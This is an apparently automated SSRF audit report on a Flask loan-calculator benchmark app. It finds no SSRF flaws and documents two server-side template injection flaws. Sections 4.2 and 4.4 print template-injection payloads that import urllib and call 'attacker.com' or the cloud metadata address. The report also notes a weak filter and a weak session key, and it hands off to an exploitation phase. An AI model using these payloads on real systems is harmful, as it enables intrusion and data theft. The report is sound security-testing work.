# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** After comprehensive white-box analysis of all network-accessible endpoints and source code, **zero Server-Side Request Forgery (SSRF) vulnerabilities were identified**. The application architecture inherently prevents SSRF by design—it makes no outbound HTTP requests and imports no HTTP client libraries.
- **Purpose of this Document:** This report documents the systematic analysis of the Flask loan calculator application's potential for SSRF vulnerabilities, explaining why the application is not susceptible to traditional SSRF attacks, and identifying the architectural characteristics that prevent this vulnerability class.

## 2. Application Architecture Overview

### 2.1 Technology Stack
- **Backend:** Python 3 with Flask 3.0.3
- **Database:** MySQL 5.7.15 via Flask-SQLAlchemy 3.1.1 and PyMySQL 1.1.0
- **Frontend:** Bootstrap CSS with jQuery 3.6.0
- **Web Server:** Apache 2.4.65 (Debian) with mod_wsgi
- **Deployment:** Docker containers on `http://localhost:37579/`

### 2.2 Network Communication Patterns
The application's network activity is strictly limited to:
1. **Inbound HTTP requests** - Receiving requests on port 80 (Apache)
2. **Database communication** - Internal MySQL connection on port 3306 (Docker network only)

**Critical Finding:** The application makes **zero outbound HTTP requests** to external services or user-provided URLs.

### 2.3 Dependency Analysis
From `requirements.txt`:
```
flask==3.0.3
flask-sqlalchemy==3.1.1
pymysql==1.1.0
```

**No HTTP client libraries present:**
- ❌ No `requests` library
- ❌ No `urllib` imports
- ❌ No `httplib`/`http.client`
- ❌ No `httpx`, `aiohttp`, `pycurl`, or third-party HTTP clients
- ❌ No `socket` usage for raw connections

## 3. Comprehensive SSRF Sink Analysis

### 3.1 Methodology Applied
Following the backward taint analysis methodology, all network-accessible endpoints were analyzed for:
1. HTTP client usage patterns
2. URL/hostname parameter processing
3. Outbound request mechanisms
4. Redirect following behavior
5. File inclusion with remote URLs
6. Webhook/callback functionality
7. Media processor URL handling
8. SSO/OIDC discovery endpoints

### 3.2 Endpoint Analysis Results

| Endpoint | Method | Parameters | SSRF Sink Analysis | Verdict |
|----------|--------|------------|-------------------|---------|
| `/` | GET | None | Simple redirect to `/login` using `url_for()`. No user input, no outbound requests. | **SAFE** |
| `/login` | GET, POST | `username`, `password` | Database query only. Credentials checked against MySQL. No HTTP requests. | **SAFE** |
| `/logout` | GET | None | Session clearing only. No external communication. | **SAFE** |
| `/home` | GET | None | Database query to fetch user data. Template rendering only. | **SAFE** |
| `/profile` | GET, POST | `name`, `lastname`, `email`, `loan_amount`, `loan_term_months`, `monthly_payment` | Database write operation. No URL processing or outbound requests. | **SAFE** |
| `/loan_details` | GET | None | Database query and iframe rendering. No external requests. | **SAFE** |
| `/total_loan_payments` | GET | `principal`, `payment`, `term` | Mathematical calculation and JSON response. **SSTI vulnerability present** but no HTTP client usage. | **SAFE** (no SSRF) |
| `/amortization` | GET | `term` | Template rendering for amortization table. **SSTI vulnerability present** but no HTTP client usage. | **SAFE** (no SSRF) |

### 3.3 Detailed Code Analysis

#### 3.3.1 HTTP Clients - Not Found
**Search Patterns:**
```python
# Python requests library
import requests
requests.get()
requests.post()

# urllib variants
import urllib
import urllib.request
import urllib2
import urllib3
urllib.request.urlopen()

# http.client
import httplib
import http.client
http.client.HTTPConnection()

# Third-party clients
import httpx
import aiohttp
import pycurl
```

**Finding:** None of these patterns exist in the application codebase. File: `routes.py` contains zero HTTP client imports or usage.

#### 3.3.2 Raw Sockets - Not Found
**Search Patterns:**
```python
import socket
socket.socket()
socket.connect()
socket.create_connection()
```

**Finding:** No raw socket usage detected. The only network communication is through Flask (inbound) and PyMySQL (to local database).

#### 3.3.3 Redirect Handlers - Safe Implementation
**File:** `routes.py`

All redirects use Flask's `url_for()` with hardcoded internal route names:
```python
# Line 19: Root redirect
return redirect(url_for('login'))

# Line 32: Successful login redirect
return redirect(url_for('home'))

# Line 43: Logout redirect
return redirect(url_for('login'))

# Lines 55, 79, 92, 119: Unauthorized access redirects
return redirect(url_for('login'))

# Line 73: Profile update success redirect
return redirect(url_for('home'))
```

**Security Assessment:** All redirects use internal route names with zero user input. No open redirect vulnerabilities exist. The pattern `redirect(url_for('hardcoded_route_name'))` generates application-internal URLs only.

**No SSRF Risk:** Flask's `redirect()` generates HTTP 302 responses with `Location` headers. This is a **client-side redirect instruction**—no server-side request is initiated.

#### 3.3.4 File Operations - Safe Implementation
**Analysis:** File operations are limited to:
- Template file reading (Flask's internal `render_template()` mechanism)
- Static file serving (handled by Apache, not Python code)
- No `open()` calls with user-controlled paths
- No file operations with URL schemes (http://, ftp://, file://)

#### 3.3.5 Media Processors - Not Found
**Search Patterns:**
- ImageMagick: `import wand`, `subprocess` calls to `convert`
- FFmpeg: `subprocess` calls to `ffmpeg`
- PDF generators: `pdfkit`, `weasyprint`, `reportlab`

**Finding:** No media processing libraries detected. Application handles only text/numeric data (loan calculations).

#### 3.3.6 Webhook/Callback - Not Found
**Search Patterns:**
- Webhook ping endpoints
- Callback verification
- Outbound HTTP POST to user-provided URLs

**Finding:** No webhook or callback functionality exists. Application does not accept URL parameters for external notification.

#### 3.3.7 SSO/OIDC Discovery - Not Found
**Search Patterns:**
- JWKS fetchers: `requests.get(jwks_uri)`
- OpenID Connect discovery: `.well-known/openid-configuration`
- OAuth metadata endpoints

**Finding:** Application uses only local database authentication. No SSO, OAuth, OIDC, or SAML integrations exist.

#### 3.3.8 Importers/URL Fetchers - Not Found
**Search Patterns:**
- "Import from URL" functionality
- CSV/JSON/XML remote fetchers
- RSS/Atom feed readers

**Finding:** No data import functionality exists. All data entry is through HTML forms writing to local MySQL.

#### 3.3.9 Cloud Metadata Access - Not Found
**Search Patterns:**
- AWS SDK: `import boto3`
- GCP SDK: `from google.cloud import ...`
- Azure SDK: `from azure.identity import ...`
- Metadata API: `http://169.254.169.254/...`

**Finding:** No cloud provider SDK usage. Application is containerized but does not access cloud metadata services.

#### 3.3.10 Subprocess Calls - Not Found
**Search Patterns:**
```python
import subprocess
subprocess.run()
subprocess.Popen()
subprocess.call()
os.system()
os.popen()
os.exec*()
```

**Finding:** No subprocess execution in application code. The only subprocess usage is in Docker Compose healthchecks (infrastructure level, not user-controllable).

## 4. SSTI Vulnerabilities and Their Relationship to SSRF

### 4.1 Identified SSTI Vulnerabilities
Two Server-Side Template Injection (SSTI) vulnerabilities were identified in the reconnaissance phase:

1. **`/total_loan_payments`** - `principal` parameter (authenticated)
   - File: `routes.py:110-115`
   - User input flows to `render_template_string()` without validation
   - Enables Remote Code Execution (RCE)

2. **`/amortization`** - `term` parameter (unauthenticated)
   - File: `routes.py:122-177`
   - Weak blacklist filter (blocks `{`, `}`, `%`)
   - Enables Remote Code Execution (RCE)

### 4.2 SSTI vs. SSRF Distinction

**Important Clarification:** While these SSTI vulnerabilities enable RCE, they do **NOT constitute traditional SSRF vulnerabilities**. Here's why:

#### Traditional SSRF:
- Application **legitimately** makes outbound HTTP requests as part of its design
- Attacker **controls the URL** passed to existing HTTP client code
- Example: Image fetcher accepts `url` parameter and passes it to `requests.get(url)`

#### SSTI-Enabled SSRF:
- Application has **RCE vulnerability** (SSTI, command injection, etc.)
- Attacker **injects code** that imports HTTP libraries and makes requests
- Example: SSTI payload like `{{request.application.__globals__.__builtins__.__import__('urllib.request').urlopen('http://attacker.com')}}`

**This is SSRF as a consequence of RCE, not a standalone SSRF vulnerability.**

### 4.3 Why This Distinction Matters

1. **Remediation Approach:**
   - Traditional SSRF: Add URL validation, allowlists, protocol restrictions
   - SSTI-enabled SSRF: Fix the RCE vulnerability (SSTI remediation)

2. **Attack Complexity:**
   - Traditional SSRF: Simple URL manipulation
   - SSTI-enabled SSRF: Requires crafting template injection payload, bypassing filters, and importing libraries

3. **Scope:**
   - Traditional SSRF: Limited to application's HTTP client capabilities
   - SSTI-enabled SSRF: Full Python code execution, can do anything

### 4.4 SSTI Exploitation Could Enable SSRF-Like Behavior

**Theoretical Attack Path:**
```python
# Example SSTI payload through /amortization?term=...
# (Assuming blacklist bypass)
{{request.application.__globals__.__builtins__.__import__('urllib.request').urlopen('http://169.254.169.254/latest/meta-data/')}}
```

**This enables:**
- Cloud metadata access
- Internal service reconnaissance
- Data exfiltration to external servers
- Port scanning of internal network

**However, this is classified as RCE exploitation, not SSRF vulnerability.**

## 5. Vectors Analyzed and Confirmed Secure

This section documents components that were analyzed and found to have no SSRF vulnerabilities due to architectural design.

| Component/Flow | Analysis Performed | Defense Mechanism | Verdict |
|---|---|---|---|
| Login Form Processing | Traced `username` and `password` parameters from `request.form` to SQLAlchemy query | Parameters only used in database query, never in HTTP requests | **SAFE** |
| Profile Update | Traced all POST parameters (`name`, `email`, `loan_amount`, etc.) to database write | Data only persisted to MySQL, no external communication | **SAFE** |
| Redirect Functionality | Analyzed all `redirect()` calls in routes.py | All use `url_for()` with hardcoded route names, no user input | **SAFE** |
| Session Management | Analyzed Flask session cookie creation and validation | Client-side signed cookies, no server-side HTTP requests | **SAFE** |
| Static File Serving | Reviewed `/static/` directory handling | Handled by Apache directly, no Python file operations | **SAFE** |
| Database Communication | Reviewed PyMySQL/SQLAlchemy usage | Internal Docker network only, no user-controlled connection strings | **SAFE** |
| Loan Calculation Logic | Analyzed `/total_loan_payments` and `/amortization` | Pure mathematical operations, no network communication | **SAFE** (no SSRF risk, SSTI risk documented separately) |
| Template Rendering | Reviewed all `render_template()` and `render_template_string()` calls | Templates render to HTML responses, no outbound requests | **SAFE** (no SSRF risk) |

## 6. Architecture Design Patterns Preventing SSRF

### 6.1 Positive Security Controls

The following architectural characteristics inherently prevent SSRF:

1. **No HTTP Client Dependencies:** The application's `requirements.txt` contains zero HTTP client libraries.

2. **Self-Contained Functionality:** All features operate on local data (database and user sessions) without external integration.

3. **Internal Redirects Only:** Flask's `url_for()` pattern ensures all redirects resolve to application routes.

4. **No URL Parameters:** No endpoint accepts parameters named `url`, `callback`, `webhook`, `redirect_uri`, or similar.

5. **No File URL Schemes:** No file operations accept URLs with protocols (http://, ftp://, file://).

6. **Database-Only Backend Communication:** The only backend communication is with MySQL on the internal Docker network.

### 6.2 Comparison to Vulnerable Patterns

**Vulnerable Pattern:**
```python
# SSRF-vulnerable code (NOT present in this application)
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)  # SSRF VULNERABILITY
    return response.text
```

**This Application's Pattern:**
```python
# Safe pattern (actual application code)
@app.route('/home')
def home():
    user_id = session.get('user_id')
    user = User.query.get(user_id)  # Database query only
    return render_template('home.html', user=user)
```

**Key Difference:** No HTTP client, no URL parameter, no outbound request.

## 7. Scope Validation: External Attacker Perspective

### 7.1 Attack Surface from Internet
**Target:** `http://localhost:37579/`

**Accessible Endpoints:**
- ✅ `/` - Public (redirect)
- ✅ `/login` - Public (authentication)
- ✅ `/logout` - Public (session clearing)
- ✅ `/amortization` - **Public (missing authentication)** - SSTI vulnerability
- 🔒 `/home` - Requires authentication
- 🔒 `/profile` - Requires authentication
- 🔒 `/loan_details` - Requires authentication
- 🔒 `/total_loan_payments` - Requires authentication

### 7.2 SSRF Exploitability Assessment
**From external attacker perspective (internet access to localhost:37579):**

| Endpoint | SSRF Sink Present? | Externally Exploitable? | Confidence |
|----------|-------------------|------------------------|-----------|
| `/` | No | N/A | N/A |
| `/login` | No | N/A | N/A |
| `/logout` | No | N/A | N/A |
| `/home` | No | N/A | N/A |
| `/profile` | No | N/A | N/A |
| `/loan_details` | No | N/A | N/A |
| `/total_loan_payments` | No | N/A | N/A |
| `/amortization` | No | N/A | N/A |

**Conclusion:** Zero SSRF vulnerabilities exploitable from external network access.

## 8. Conclusion and Recommendations

### 8.1 SSRF Vulnerability Status
**FINAL ASSESSMENT: NO SSRF VULNERABILITIES IDENTIFIED**

The Flask loan calculator application is **not vulnerable to Server-Side Request Forgery** due to its architectural design:
- No HTTP client libraries imported or used
- No outbound network requests in any code path
- No URL fetching, webhook calling, or external API integration
- All redirects use internal routes only
- No user-controlled parameters flow to network operations

### 8.2 Relationship to Other Vulnerabilities
While no SSRF vulnerabilities exist, the application has **critical SSTI vulnerabilities** that enable RCE. An attacker exploiting SSTI could:
- Import HTTP libraries in template injection payloads
- Make arbitrary outbound requests (SSRF-like behavior as a consequence of RCE)
- Access cloud metadata services if deployed in cloud environments
- Perform internal network reconnaissance
- Exfiltrate sensitive data to external servers

**However, these are consequences of RCE, not standalone SSRF vulnerabilities.**

### 8.3 Recommendations

1. **Primary Focus:** Remediate SSTI vulnerabilities in `/total_loan_payments` and `/amortization` endpoints:
   - Use `render_template()` instead of `render_template_string()`
   - Never embed user input in template strings via f-strings
   - Implement strict input validation with allowlists
   - Add missing authentication check to `/amortization`

2. **Maintain SSRF-Free Architecture:** When adding new features:
   - Avoid introducing HTTP client dependencies unless absolutely necessary
   - If outbound requests are required, implement comprehensive SSRF protections:
     - URL allowlisting (not blocklisting)
     - Protocol restrictions (HTTPS only)
     - IP address validation (block private ranges, cloud metadata IPs)
     - Timeout controls
     - Response size limits

3. **Defense in Depth:** Even though no SSRF vulnerabilities exist:
   - Network-level controls (firewall rules) should restrict container outbound access
   - Monitor for unexpected outbound connections
   - Apply principle of least privilege to container network permissions

### 8.4 Exploitation Phase Handoff
**No SSRF exploitation queue items generated.** The exploitation phase should focus on:
- SSTI vulnerabilities (documented in separate analysis)
- Authentication bypass opportunities
- Session forgery due to weak secret key
- Other vulnerability classes identified in reconnaissance

---

## Appendix A: Analysis Metadata

**Analysis Date:** 2025
**Analyst:** SSRF Analysis Specialist (Automated)
**Application:** Flask Loan Calculator (XBEN-023-24)
**Target URL:** http://localhost:37579/
**Source Code Location:** /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/app/website/app/
**Methodology:** White-box backward taint analysis following OWASP guidelines
**Tools Used:** Code review, dependency analysis, endpoint mapping
**Confidence Level:** **High** - Complete source code access, all endpoints analyzed, zero HTTP client usage confirmed

---

**END OF SSRF ANALYSIS REPORT**